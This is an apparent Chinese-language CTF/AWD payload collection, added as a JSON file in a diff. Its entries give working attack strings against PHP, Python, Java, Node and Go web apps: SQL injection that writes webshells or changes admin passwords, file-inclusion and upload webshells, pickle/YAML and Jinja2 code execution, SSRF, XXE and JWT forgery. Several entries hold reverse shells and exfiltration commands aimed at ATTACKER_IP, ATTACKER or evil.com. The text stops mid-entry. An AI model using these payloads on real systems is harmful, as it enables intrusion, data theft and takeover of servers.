@@ -1,0 +1,1772 @@
+{
+ "version": "1.1.0",
+ "exported_at": "2026-11-09T16:59:50.000Z",
+ "payloads": [
+  {
+   "id": "payload-php-sqli-union",
+   "title": "PHP SQL 注入: UNION / 报错",
+   "language": "php",
+   "category": "sqli",
+   "description": "适合快速判断列数、回显位和数据库用户。",
+   "body": "' order by 3--+\n' union select 1,2,3--+\n' and updatexml(1,concat(0x7e,user(),0x7e),1)--+"
+  },
+  {
+   "id": "payload-php-lfi-filter",
+   "title": "PHP LFI: php://filter",
+   "language": "php",
+   "category": "lfi",
+   "description": "读取 PHP 源码时优先试 filter 链。",
+   "body": "../../index.php\nphp://filter/convert.base64-encode/resource=index.php\nphp://filter/read=convert.base64-encode/resource=../config.php"
+  },
+  {
+   "id": "payload-php-upload-polyglot",
+   "title": "PHP 上传: 双后缀 / Polyglot",
+   "language": "php",
+   "category": "upload",
+   "description": "结合解析差异和图片头混淆。",
+   "body": "shell.php.jpg\nshell.phtml\nGIF89a<?php @eval($_POST['x']); ?>"
+  },
+  {
+   "id": "payload-php-deser-cookie",
+   "title": "PHP 反序列化: Cookie / Session",
+   "language": "php",
+   "category": "deserialization",
+   "description": "针对 cookie、rememberMe、session 存储点。",
+   "body": "O:4:\"User\":2:{s:4:\"name\";s:5:\"admin\";s:5:\"isVip\";b:1;}\na:2:{s:4:\"user\";O:4:\"Test\":0:{}s:4:\"role\";s:5:\"admin\";}"
+  },
+  {
+   "id": "payload-python-jinja2",
+   "title": "Python Jinja2 SSTI",
+   "language": "python",
+   "category": "ssti",
+   "description": "先算术，再走对象链。",
+   "body": "{{7*7}}\n{{config}}\n{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
+  },
+  {
+   "id": "payload-python-pickle",
+   "title": "Python Pickle 反序列化",
+   "language": "python",
+   "category": "deserialization",
+   "description": "对 pickle.loads、joblib.load、torch.load 场景有效。",
+   "body": "import os, pickle\nclass R:\n    def __reduce__(self):\n        return (os.system, ('id',))\nprint(pickle.dumps(R()))"
+  },
+  {
+   "id": "payload-python-ssrf",
+   "title": "Python SSRF 内网探测",
+   "language": "python",
+   "category": "ssrf",
+   "description": "常见 metadata、本机和十进制 IP 写法。",
+   "body": "http://127.0.0.1/\nhttp://169.254.169.254/latest/meta-data/\nhttp://2130706433/"
+  },
+  {
+   "id": "payload-java-spel",
+   "title": "Java SpEL / Thymeleaf",
+   "language": "java",
+   "category": "ssti",
+   "description": "Spring / Thymeleaf 题型常见表达式。",
+   "body": "${7*7}\n${T(java.lang.Runtime).getRuntime().exec('id')}\n${T(org.springframework.util.FileCopyUtils).copyToByteArray(new java.io.File('/flag'))}"
+  },
+  {
+   "id": "payload-java-xxe",
+   "title": "Java XXE",
+   "language": "java",
+   "category": "xxe",
+   "description": "通用外部实体和本地文件读取。",
+   "body": "<?xml version=\"1.0\"?>\n<!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<root>&xxe;</root>"
+  },
+  {
+   "id": "payload-java-deser",
+   "title": "Java 反序列化探测",
+   "language": "java",
+   "category": "deserialization",
+   "description": "先用 URLDNS 测探，再换真实 gadget。",
+   "body": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAAAAAAAAAABAwABTAADbWFwdAAPTGphdmEvdXRpbC9NYXA7eHB3BAAAAAB4"
+  },
+  {
+   "id": "payload-node-ejs",
+   "title": "Node EJS / Pug SSTI",
+   "language": "nodejs",
+   "category": "ssti",
+   "description": "Node 模板执行与命令注入结合。",
+   "body": "<%= 7*7 %>\n<%= global.process.mainModule.require('child_process').execSync('id') %>"
+  },
+  {
+   "id": "payload-node-nosqli",
+   "title": "Node NoSQL 注入",
+   "language": "nodejs",
+   "category": "nosqli",
+   "description": "针对 Mongo 查询拼接和 JSON 直接反序列化。",
+   "body": "{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}\n{\"$where\":\"this.password.match(/.*/)//\"}"
+  },
+  {
+   "id": "payload-node-proto",
+   "title": "Node 原型污染",
+   "language": "nodejs",
+   "category": "prototype-pollution",
+   "description": "针对 merge、clone、flatnest 类场景。",
+   "body": "{\"__proto__\":{\"isAdmin\":true}}\n{\"constructor\":{\"prototype\":{\"debug\":true}}}"
+  },
+  {
+   "id": "payload-go-template",
+   "title": "Go Template 注入",
+   "language": "go",
+   "category": "ssti",
+   "description": "Go text/template 和 pongo2 常见表达式。",
+   "body": "{{printf \"%s\" \"test\"}}\n{{.}}\n{{call .ReadFile \"/flag\"}}"
+  },
+  {
+   "id": "payload-go-traversal",
+   "title": "Go 路径穿越",
+   "language": "go",
+   "category": "lfi",
+   "description": "针对 path.Join、filepath.Clean 误用。",
+   "body": "../../../flag\n..%2f..%2f..%2fflag\n%252e%252e%252f%252e%252e%252fflag"
+  },
+  {
+   "id": "payload-multi-jwt",
+   "title": "JWT 伪造 / 认证绕过",
+   "language": "php",
+   "category": "jwt",
+   "description": "适合算法混淆、none、kid 注入题型。",
+   "body": "{\"alg\":\"none\",\"typ\":\"JWT\"}\n{\"alg\":\"HS256\",\"kid\":\"../../../dev/null\"}\n{\"sub\":\"admin\",\"role\":\"admin\"}"
+  },
+  {
+   "id": "payload-php-ssrf-gopher",
+   "title": "PHP SSRF: Redis / HTTP Gopher",
+   "language": "php",
+   "category": "ssrf",
+   "description": "适合 curl、file_get_contents 一类出网点继续打内网。",
+   "body": "gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a\ngopher://127.0.0.1:80/_GET%20/%20HTTP/1.1%0d%0aHost:127.0.0.1%0d%0a%0d%0a\nhttp://127.1/admin"
+  },
+  {
+   "id": "payload-php-xxe-wrapper",
+   "title": "PHP XXE / Wrapper 读文件",
+   "language": "php",
+   "category": "xxe",
+   "description": "兼顾普通 XXE 和 php://filter 读取。",
+   "body": "<?xml version=\"1.0\"?>\n<!DOCTYPE root [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\">]>\n<root>&xxe;</root>"
+  },
+  {
+   "id": "payload-python-sqli-orm",
+   "title": "Python SQL 注入: ORM / f-string",
+   "language": "python",
+   "category": "sqli",
+   "description": "针对 SQLAlchemy text/raw、f-string 拼接场景。",
+   "body": "' OR 1=1--\nadmin' UNION SELECT 1,2,version()--\n%' OR '1'='1"
+  },
+  {
+   "id": "payload-python-auth-headers",
+   "title": "Python 认证绕过: Proxy Headers",
+   "language": "python",
+   "category": "auth-bypass",
+   "description": "适合 Flask / Django 反代信任头场景。",
+   "body": "X-Forwarded-For: 127.0.0.1\nX-Original-URL: /admin\nX-Forwarded-Host: localhost\nX-Real-IP: 127.0.0.1"
+  },
+  {
+   "id": "payload-java-archive-slip",
+   "title": "Java Archive Slip Entry",
+   "language": "java",
+   "category": "archive-slip",
+   "description": "压缩包写文件题优先准备 Web 根和 SSH 路径。",
+   "body": "../../../../webapps/ROOT/shell.jsp\n..\\..\\..\\..\\tomcat\\webapps\\ROOT\\shell.jsp\n../../../../.ssh/authorized_keys"
+  },
+  {
+   "id": "payload-java-ssrf-actuator",
+   "title": "Java SSRF: Actuator / Jolokia",
+   "language": "java",
+   "category": "ssrf",
+   "description": "适合 Spring / Java 服务常见探测目标。",
+   "body": "http://127.0.0.1:8080/actuator/env\nhttp://127.0.0.1:8778/jolokia/read/java.lang:type=Runtime/Uptime\nhttp://localhost:8080/actuator/heapdump"
+  },
+  {
+   "id": "payload-node-jwt-forge",
+   "title": "Node JWT 伪造",
+   "language": "nodejs",
+   "category": "jwt",
+   "description": "覆盖 none、kid、jku/jwk 方向。",
+   "body": "{\"alg\":\"none\",\"typ\":\"JWT\"}\n{\"alg\":\"HS256\",\"kid\":\"../../../../dev/null\"}\n{\"alg\":\"RS256\",\"jku\":\"https://attacker/jwks.json\"}"
+  },
+  {
+   "id": "payload-node-ssrf-cloud",
+   "title": "Node SSRF: Metadata / Host Trick",
+   "language": "nodejs",
+   "category": "ssrf",
+   "description": "Node HTTP client 常见可达目标与主机写法。",
+   "body": "http://169.254.169.254/latest/meta-data/\nhttp://[::1]/\nhttp://0177.0.0.1/"
+  },
+  {
+   "id": "payload-go-sqli-format",
+   "title": "Go SQL 注入: fmt.Sprintf",
+   "language": "go",
+   "category": "sqli",
+   "description": "适合 string concat / fmt.Sprintf 拼接查询。",
+   "body": "' OR '1'='1\n' UNION SELECT user(),database(),version()--\n%' OR 1=1 -- "
+  },
+  {
+   "id": "payload-go-archive-slip",
+   "title": "Go ZipSlip Entry 名",
+   "language": "go",
+   "category": "archive-slip",
+   "description": "压缩解包题优先准备 Web 根目录和 SSH 路径。",
+   "body": "../../../../var/www/html/shell.php\n../../../../root/.ssh/authorized_keys\n..\\..\\..\\..\\ProgramData\\shell.bat"
+  },
+  {
+   "id": "payload-php-sqli-blind",
+   "title": "PHP SQL 注入: 布尔 / 时间盲注",
+   "language": "php",
+   "category": "sqli",
+   "description": "无回显时按位判断数据，AWD 里最稳的取数方式；注意先确认是否被 WAF 拦。",
+   "body": "-- 布尔盲注（逐字符）\n' and substr((select database()),1,1)='a'--+\n' and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{n},1))>{mid}--+\n-- 时间盲注（MySQL）\n' and if(ascii(substr((select user()),1,1))=114,sleep(3),0)--+\n' or sleep(if(substr((select version()),1,1)='8',3,0))--+\n-- 时间盲注（PG）\n'; select case when (select substr(current_user,1,1))='p' then pg_sleep(3) else pg_sleep(0) end--+\n-- 二分脚本骨架\nlo,hi=32,127\nwhile lo<hi:\n    mid=(lo+hi)//2\n    if blind(f\"ascii(substr(({q}),{n},1))>{mid}\"): lo=mid+1\n    else: hi=mid"
+  },
+  {
+   "id": "payload-php-sqli-stacked",
+   "title": "PHP SQL 注入: 堆叠 / 多语句 / 写文件",
+   "language": "php",
+   "category": "sqli",
+   "description": "PDO 默认不允许多语句，mysqli_query 单次执行；能堆叠时优先写文件而不是拖库。",
+   "body": "-- 探测是否支持堆叠\n1'; select 1--+\n-- MySQL 写 webshell（需 FILE 权限 + secure_file_priv 为空）\n1'; select '<?php @eval($_POST[1]);?>' into outfile '/var/www/html/x.php'--+\n1'; select unhex('3c3f706870...') into dumpfile '/var/www/html/x.php'--+\n-- 读文件\n1' union select load_file('/etc/passwd'),2,3--+\n-- 改管理员密码（AWD 常用）\n1'; update users set password=md5('pwned') where id=1--+\n-- 建账号\n1'; insert into users(username,password) values('pwned',md5('pwned'))--+\n-- PG 命令执行（超级用户）\n1'; copy (select '') to program 'id > /tmp/o'--+"
+  },
+  {
+   "id": "payload-php-rce-system",
+   "title": "PHP 命令执行: 常用执行点与回连",
+   "language": "php",
+   "category": "rce",
+   "description": "system/exec/shell_exec/passthru/popen/proc_open/反引号 逐个试，注意 disable_functions。",
+   "body": "id;whoami;uname -a\nls -la / ; cat /flag* 2>/dev/null; find / -maxdepth 3 -name 'flag*' 2>/dev/null\n# 反弹\nbash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'\nnc -e /bin/sh ATTACKER_IP 4444\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f\n# 无回显外带\ncurl http://ATTACKER_IP/`id|base64 -w0`\nping -c1 `id|base64 -w0`.ATTACKER_IP\n# disable_functions 常见替代\npcntl_exec('/bin/sh',['-c','id']);\nputenv('LD_PRELOAD=/tmp/evil.so'); mail('a@b','c','d');\nimap_open('{ATTACKER_IP:143}/x','','');"
+  },
+  {
+   "id": "payload-php-rce-dynamic-call",
+   "title": "PHP 代码执行: 动态函数与回调",
+   "language": "php",
+   "category": "rce",
+   "description": "审计时这类写法最容易被忽略：变量函数、call_user_func、array_map、preg_replace /e、create_function。",
+   "body": "$f=$_GET['f']; $f($_GET['a']);                      // 变量函数\ncall_user_func($_GET['f'], $_GET['a']);\ncall_user_func_array('assert', [$_POST[1]]);\narray_map('system', (array)$_GET['c']);\narray_filter([$_GET['c']], 'assert');\npreg_replace('/.*/e', $_POST[1], '');                 // PHP<7\ncreate_function('', $_POST[1]);                       // PHP<8\nusort($arr, $_GET['cb']);\nregister_shutdown_function($_GET['f']);\nob_start($_GET['f']);\nassert($_POST[1]);                                    // PHP<8 字符串模式\n${'_'.'POST'}[1]($_POST[2]);                          // 变量变量绕过关键字"
+  },
+  {
+   "id": "payload-php-code-eval",
+   "title": "PHP 代码执行: eval / assert / 字符串拼接变形",
+   "language": "php",
+   "category": "rce",
+   "description": "eval 是语言结构不能当回调；关键字被过滤时用拼接、chr、base64_decode 还原。",
+   "body": "eval($_POST[1]);\neval($_POST['a'].$_POST['b']);            // 拆分绕过关键字检测\neval(base64_decode('ZWNobyAxOw=='));\nassert($_REQUEST['c']);\neval(gzinflate(base64_decode('...')));    // 冰蝎/哥斯拉常见外层\n$a='sys'.'tem'; $a('id');\n$f=\"\\x73\\x79\\x73\\x74\\x65\\x6d\"; $f('id');\neval($_GET['x'] ?? ''); // 仅自测用"
+  },
+  {
+   "id": "payload-php-lfi-pearcmd",
+   "title": "PHP 文件包含: pearcmd.php 写马",
+   "language": "php",
+   "category": "lfi",
+   "description": "目标存在 include($_GET[..]) 且 PHP 自带 PEAR 时，无需日志投毒即可写文件。",
+   "body": "# 1) 确认包含生效（register_argc_argv 需开启）\n?file=/usr/local/lib/php/pearcmd.php&+config-create+/<?=eval($_POST[1]);?>+/tmp/s.php\n# 2) 常见 pearcmd 路径\n/usr/local/lib/php/pearcmd.php\n/usr/share/php/pearcmd.php\n/usr/lib/php/pearcmd.php\n# 3) 变体（带 config 文件名冲突时换路径）\n?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo();?>+/tmp/a.php\n# 4) 包含落地文件\n?file=/tmp/s.php"
+  },
+  {
+   "id": "payload-php-lfi-phpfilter",
+   "title": "PHP 文件包含: php://filter 链（无落地 RCE）",
+   "language": "php",
+   "category": "lfi",
+   "description": "PHP >= 7 可用 iconv 过滤器链把任意内容变成任意 PHP 代码，绕开对 <? 与写入权限的限制。",
+   "body": "# 生成脚本（php_filter_chain_generator）\npython3 php_filter_chain_generator.py --chain '<?=system($_GET[1]);?>'\n# 结果形如\nphp://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|.../resource=index.php\n# 极简版本（PHP<8 常用，读源码）\nphp://filter/convert.base64-encode/resource=index.php\nphp://filter/read=string.rot13/resource=config.php\n# 只读 + 大写化过滤\nphp://filter/read=convert.iconv.utf-8.utf-16/resource=flag.php"
+  },
+  {
+   "id": "payload-php-lfi-logpoison",
+   "title": "PHP 文件包含: 日志 / 会话 / 临时文件投毒",
+   "language": "php",
+   "category": "lfi",
+   "description": "没有写权限时的经典路径；注意 Apache/Nginx 日志路径与 UA 注入点。",
+   "body": "# 1) UA 投毒 + 包含访问日志\ncurl -A '<?=eval($_POST[1]);?>' http://TARGET/\n?file=/var/log/apache2/access.log\n/var/log/httpd/access_log\n/var/log/nginx/access.log\n/usr/local/nginx/logs/access.log\n# 2) 错误日志\n?file=/var/log/apache2/error.log   （先制造 404 带 payload）\n# 3) SSH 日志\n?file=/var/log/auth.log\n# 4) 会话文件投毒\n?file=/tmp/sess_<PHPSESSID>   （先往 session 里写 payload）\n# 5) /proc 自读\n?file=/proc/self/environ   （UA 注入）\n?file=/proc/self/fd/0"
+  },
+  {
+   "id": "payload-php-session-upload-progress",
+   "title": "PHP 文件包含: session.upload_progress 写临时文件",
+   "language": "php",
+   "category": "lfi",
+   "description": "session.upload_progress.enabled=On 时，上传进度会把可控内容写进 session 文件，配合 LFI 直接 RCE。",
+   "body": "# 1) 构造表单（PHPSESSID 自己指定）\nPOST /upload.php\nCookie: PHPSESSID=pwn\nContent-Type: multipart/form-data; boundary=--\n-- --\nContent-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\n<?=eval($_POST[1]);?>\n-- --\nContent-Disposition: form-data; name=\"f\"; filename=\"a.txt\"\nAAAA\n-- -- --\n# 2) 并发包含（脚本要跑起来，否则临时文件被清理）\n?file=/tmp/sess_pwn\n# 3) 常用 session 路径\n/var/lib/php/sessions/sess_pwn\n/tmp/sess_pwn\n/var/lib/php5/sess_pwn\nC:\\Windows\\Temp\\sess_pwn"
+  },
+  {
+   "id": "payload-php-phar-deser",
+   "title": "PHP 反序列化: phar:// 触发点",
+   "language": "php",
+   "category": "deserialization",
+   "description": "文件操作函数（file_exists/stat/filesize/getimagesize/unlink）都会解析 phar 元数据，是隐藏的反序列化入口。",
+   "body": "# 1) 生成恶意 phar（PHP >= 8 需去掉只读标志）\nphp -d phar.readonly=0 -r '$p=new Phar(\"/tmp/x.phar\");$p->startBuffering();\n$p->addFromString(\"a.txt\",\"a\");$p->setStub(\"<?php __HALT_COMPILER(); ?>\");\n$p->setMetadata(new Evil());$p->stopBuffering();'\n# 2) 触发（任意文件函数）\nfile_exists('phar:///tmp/x.phar/a.txt');\n# 3) 上传后把 phar 改名成图片绕过检测\nmv x.phar x.jpg   → phar:///upload/x.jpg/a.txt\n# 4) 绕过 __HALT_COMPILER 检测：加 GIF89a 头\n# 5) 常见链：ThinkPHP / Laravel / Monolog / Guzzle"
+  },
+  {
+   "id": "payload-php-upload-htaccess",
+   "title": "PHP 文件上传: .htaccess / .user.ini 覆盖",
+   "language": "php",
+   "category": "upload",
+   "description": "不能直接传 php 时，先传配置文件让任意扩展名被当 PHP 解析。",
+   "body": "# 1) .htaccess（Apache + AllowOverride All）\nAddType application/x-httpd-php .jpg\n<FilesMatch \".+\">\nSetHandler application/x-httpd-php\n</FilesMatch>\nphp_value auto_append_file /upload/shell.jpg\n# 2) .user.ini（PHP-FPM / CGI，需等 300s 或重启）\nauto_prepend_file=/upload/shell.jpg\n# 3) 覆盖目录索引 / 错误页\nDirectoryIndex shell.jpg\n# 4) 上传后用 .jpg 访问\nGET /upload/shell.jpg?1=system('id');"
+  },
+  {
+   "id": "payload-php-upload-bypass-ext",
+   "title": "PHP 文件上传: 扩展名与解析组合",
+   "language": "php",
+   "category": "upload",
+   "description": "同一份内容，靠文件名 / Content-Type / 头部三处变形命中不同解析器。",
+   "body": "shell.php\nshell.php5 / .php7 / .phtml / .pht / .phar / .inc\nshell.PHP / shell.Php   （大小写）\nshell.php.jpg / shell.jpg.php\nshell.php%00.jpg        （PHP<5.3.4）\nshell.php. .            （Windows 去尾点）\nshell.php::$DATA        （NTFS ADS）\nshell.asp;.jpg          （IIS6）\nshell.jsp;.jpg\n# Content-Type 三连\nContent-Type: image/jpeg  →  image/png  →  text/plain\n# 头部伪造\nGIF89a<?php eval($_POST[1]);?>\n\\xFF\\xD8\\xFF\\xE0<?php eval($_POST[1]);?>"
+  },
+  {
+   "id": "payload-php-ssrf-curl",
+   "title": "PHP SSRF: curl / file_get_contents 协议族",
+   "language": "php",
+   "category": "ssrf",
+   "description": "PHP 支持的 wrapper 比想象多，gopher 能把 SSRF 变成任意 TCP 报文。",
+   "body": "# file_get_contents / fopen\n?url=file:///etc/passwd\n?url=http://127.0.0.1:6379/\n?url=dict://127.0.0.1:6379/info\n?url=ftp://127.0.0.1:21/\n?url=php://filter/convert.base64-encode/resource=index.php\n?url=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+\n# gopher 打 Redis 写 shell\n?url=gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A...\n# gopher 打 MySQL / FastCGI（PHP-FPM 9000）\n?url=gopher://127.0.0.1:9000/_%01%01...\n# curl 特有\n?url=file:///flag\n?url=ldap://127.0.0.1:389/%0astats%0aquit"
+  },
+  {
+   "id": "payload-php-xxe-oob",
+   "title": "PHP XXE: 外带与 OOB 读文件",
+   "language": "php",
+   "category": "xxe",
+   "description": "libxml < 2.9 默认解析外部实体；无回显时用 FTP/HTTP 外带。",
+   "body": "# 1) 直接读\n<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>\n# 2) 参数实体 + 外带（无回显）\n<!DOCTYPE r [<!ENTITY % f SYSTEM \"file:///etc/passwd\">\n<!ENTITY % d \"<!ENTITY &#37; o SYSTEM 'http://ATTACKER/?%f;'>\">%d;%o;]>\n# 3) 盲 XXE 走 FTP（避开换行截断）\n<!DOCTYPE r [<!ENTITY % a SYSTEM \"file:///etc/passwd\">\n<!ENTITY % b \"<!ENTITY &#37; c SYSTEM 'ftp://ATTACKER:2121/%a;'>\">%b;%c;]\n# 4) PHP 特有：expect:// 直接命令\n<!DOCTYPE r [<!ENTITY x SYSTEM \"expect://id\">]><r>&x;</r>\n# 5) 读 PHP 源码要 base64 包装\n<!ENTITY x SYSTEM \"php://filter/convert.base64-encode/resource=/var/www/html/config.php\">"
+  },
+  {
+   "id": "payload-php-deser-pop",
+   "title": "PHP 反序列化: POP 链手写模板",
+   "language": "php",
+   "category": "deserialization",
+   "description": "没有现成链时按 __destruct → __toString → __call 逐步试；先用属性类型混淆造可控对象。",
+   "body": "// 1) 探针：把可控字符串塞进每个魔术方法\nclass P{ public $x; function __destruct(){ file_put_contents('/tmp/hit',get_class($this)); } }\n// 2) 常见入口\n__destruct / __wakeup / __toString / __call / __invoke / __get / __set\n// 3) 属性数量绕过 __wakeup（PHP<7.4）\nO:4:\"Test\":3:{...}   // 声明属性数与实际不符 → __wakeup 不执行\n// 4) 私有属性序列化格式（\u0000类名\u0000属性）\nO:4:\"Test\":1:{s:7:\"\\0Test\\0a\";s:2:\"id\";}\n// 5) 引用复用\na:2:{i:0;O:1:\"A\":0:{}i:1;R:2;}\n// 6) 生成\nphp -r 'echo urlencode(serialize(new Evil()));'"
+  },
+  {
+   "id": "payload-php-type-juggle",
+   "title": "PHP 认证绕过: 弱类型与 Magic Hash",
+   "language": "php",
+   "category": "auth-bypass",
+   "description": "PHP 7 及以前的 == 松散比较是 AWD 送分点；PHP 8 已修，先探版本。",
+   "body": "# 1) Magic Hash（0e 开头纯数字）\n240610708  == '0e462097431906509019562988736854'\nQNKCDZO    == '0e830400451993494058024219903391'\n# 2) 数组绕过 strcmp / in_array\npassword[]=x\n?user=admin&pass[]=1\n# 3) json 布尔 / 数字\n{\"password\":true}   {\"password\":0}\n# 4) 类型混淆（PHP 8 已修）\n\"0\" == \"\"  →  false（PHP8）/ true（PHP7）\n# 5) md5/sha1 对比\n?username[]=1&password[]=2\n# 6) in_array 未开 strict\nrole=0   →  in_array(0, ['admin','user']) === true"
+  },
+  {
+   "id": "payload-php-ssti-twig",
+   "title": "PHP SSTI: Twig / Smarty / Blade",
+   "language": "php",
+   "category": "ssti",
+   "description": "Twig 3.x 与 Smarty 3 的过滤器链都能直达 RCE，先做算术探测再上链。",
+   "body": "# Twig 探测\n{{7*7}}   {{7*'7'}}\n# Twig 1.x / 2.x\n{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}\n{{['id']|filter('system')}}\n{{['id',0]|map('system')|join}}\n# Twig 3.x（filter 被限制时）\n{{['id']|map('passthru')}}\n{{app.request.server.all|join(',')}}\n# Smarty\n{php}echo `id`;{/php}\n{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php eval($_POST[1]);?>\",self::clearConfig())}\n{system('id')}\n# Blade\n{{ system('id') }}\n@php system('id'); @endphp"
+  },
+  {
+   "id": "payload-php-var-export",
+   "title": "PHP 信息泄露: 调试函数与报错",
+   "language": "php",
+   "category": "info-leak",
+   "description": "AWD 里读配置（数据库口令、flag 路径）比拿 shell 更快。",
+   "body": "?debug=1  →  phpinfo();  var_dump($_SERVER);  print_r($GLOBALS);\n# 常见泄露点\n/phpinfo.php  /info.php  /test.php  /.env  /config.php.bak  /www.zip\n/.git/config  /.svn/entries  /composer.json  /composer.lock\n# 报错泄露绝对路径\n' and extractvalue(1,concat(0x7e,(select @@basedir)))--+\n# 通过 var_dump 打对象属性\n?obj[]=1  →  TypeError 里带类型与文件行号\n# ThinkPHP 调试\n/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"
+  },
+  {
+   "id": "payload-php-wrappers-data",
+   "title": "PHP 伪协议: data:// / expect:// / zip://",
+   "language": "php",
+   "category": "lfi",
+   "description": "allow_url_include=On 时 data:// 直接执行；zip:// 可绕过扩展名检测。",
+   "body": "# data://\n?file=data://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+\n?file=data:text/plain,<?=system('id');?>\n# expect://（需 expect 扩展）\n?file=expect://id\n# zip:// / phar://（上传 zip 后包含内部文件）\n?file=zip:///upload/x.zip%23shell.php\n?file=phar:///upload/x.zip/shell.php\n# compress.zlib://\n?file=compress.zlib:///upload/x.gz\n# 组合：先 base64 再 zlib\n?file=php://filter/zlib.inflate/resource=/upload/x.zlib"
+  },
+  {
+   "id": "payload-php-header-crlf",
+   "title": "PHP CRLF 注入 / 响应拆分",
+   "language": "php",
+   "category": "crlf",
+   "description": "header() 拼接用户输入时可注入响应头，用于 Set-Cookie 提权或 XSS。",
+   "body": "?url=%0d%0aSet-Cookie:%20role=admin\n?url=%0a%0d%0a<script>alert(1)</script>\n?url=//evil.com%0d%0aLocation:%20//evil.com\n# 编码变体\n%0d%0a  %0a  %0d  %E5%98%8A%E5%98%8D  （UTF-8 过宽字符）\n# 常见注入点\nheader(\"Location: \".$_GET['next']);\nsetcookie(\"ref\", $_GET['ref']);\nmail($to,$sub,$body,\"From: \".$_GET['from']);"
+  },
+  {
+   "id": "payload-python-ssti-filters",
+   "title": "Python SSTI: Jinja2 过滤器与全局对象",
+   "language": "python",
+   "category": "ssti",
+   "description": "从 config / self / lipsum 三个入口摸到 os，绕开对 __class__ 的过滤用 attr / |attr。",
+   "body": "{{7*7}}  {{7*'7'}}  {{config}}\n# 经典链\n{{''.__class__.__mro__[1].__subclasses__()}}\n{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}\n{{cycler.__init__.__globals__.os.popen('id').read()}}\n{{lipsum.__globals__.os.popen('id').read()}}\n{{joiner.__init__.__globals__.os.popen('id').read()}}\n{{namespace.__init__.__globals__.os.popen('id').read()}}\n{{url_for.__globals__['os'].popen('id').read()}}\n{{get_flashed_messages.__globals__.__builtins__.__import__('os').popen('id').read()}}\n# 过滤 __class__ 时\n{{''['__cl''ass__']}}\n{{''|attr('__class__')|attr('__mro__')|last|attr('__subclasses__')()}}\n{{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')}}\n# 过滤 . 时用 []，过滤引号时用 request.args 传参\n{{''[request.args.a][request.args.b]}}\n# 无回显：直接打外带\n{{cycler.__init__.__globals__.os.popen('curl http://ATTACKER/`id|base64`').read()}}"
+  },
+  {
+   "id": "payload-python-ssti-blind",
+   "title": "Python SSTI: 盲注与探测顺序",
+   "language": "python",
+   "category": "ssti",
+   "description": "先判断模板引擎，再判断是否能回显，最后选链；错误页本身就是回显。",
+   "body": "# 1) 引擎指纹\n{{7*7}}      → 49  = Jinja2/Twig\n${7*7}       → 49  = Freemarker/JSP EL\n#{7*7}       → 49  = Ruby/Ruby ERB\n<%= 7*7 %>   → 49  = ERB/EJS\n{{7*'7'}}    → 7777777 = Jinja2；49 = Twig\n# 2) 沙箱探测\n{{''.__class__}}\n{{self.__init__.__globals__}}\n{{request.__class__}}\n# 3) 回显探测\n{{config.items()}}\n# 4) 无回显：写文件 / 外带\n{{''.__class__.__mro__[1].__subclasses__()[N]('/tmp/o','w').write('x')}}\n{{lipsum.__globals__['os'].system('curl ATTACKER/`id|base64`')}}"
+  },
+  {
+   "id": "payload-python-pickle-opcodes",
+   "title": "Python 反序列化: pickle 手工字节码",
+   "language": "python",
+   "category": "deserialization",
+   "description": "不依赖目标类时用 reduce 直接调 os.system；pickle 只要能被 load 就是 RCE。",
+   "body": "# 最简 RCE\ncos\nsystem\n(S'id'\ntR.\n# 执行并回显\ncbuiltins\neval\n(S\"__import__('os').popen('id').read()\"\ntR.\n# 用 python 生成\nimport pickle,os\nclass E:\n    def __reduce__(self): return (os.system,('id',))\nprint(pickle.dumps(E()))\n# 兼容 protocol 2 的字节\npickle.dumps(E(), protocol=2)\n# 常见入口：cookie、session、缓存、redis、celery、ML 模型（torch.load/np.load allow_pickle）"
+  },
+  {
+   "id": "payload-python-yaml",
+   "title": "Python 反序列化: yaml.load / unsafe",
+   "language": "python",
+   "category": "deserialization",
+   "description": "PyYAML < 6 的 yaml.load 无 Loader 时可构造 python/object 标签。",
+   "body": "!!python/object/apply:os.system [\"id\"]\n!!python/object/apply:subprocess.check_output [[\"id\"]]\n!!python/object/new:os.system [\"id\"]\n!!python/object/apply:builtins.eval [\"__import__('os').popen('id').read()\"]\n# 文件落地\n!!python/object/apply:io.open [\"/tmp/x\",\"w\"]\n# 探测：SafeLoader 会抛 ConstructorError，FullLoader 不会执行 system\n# 同类：jsonpickle.decode、dill、marshal"
+  },
+  {
+   "id": "payload-python-sqlite",
+   "title": "Python SQL 注入: sqlite ATTACH 写文件",
+   "language": "python",
+   "category": "sqli",
+   "description": "SQLite 没有 outfile，但 ATTACH DATABASE 可以把表写成磁盘文件。",
+   "body": "' union select 1,2,3--\n'; attach database '/var/www/html/x.php' as p;--\n'; create table p.s (d text);--\n'; insert into p.s values ('<?php eval($_POST[1]);?>');--\n# 读表结构\n' union select name,sql,3 from sqlite_master--\n# 时间盲注不支持 sleep，用 heavy query\n' and (select count(*) from sqlite_master a,sqlite_master b,sqlite_master c)>0--"
+  },
+  {
+   "id": "payload-python-format-ssti",
+   "title": "Python str.format 注入",
+   "language": "python",
+   "category": "ssti",
+   "description": "用户输入进了 '...{}...'.format(x) 或 f-string 时可读对象属性，进而 RCE。",
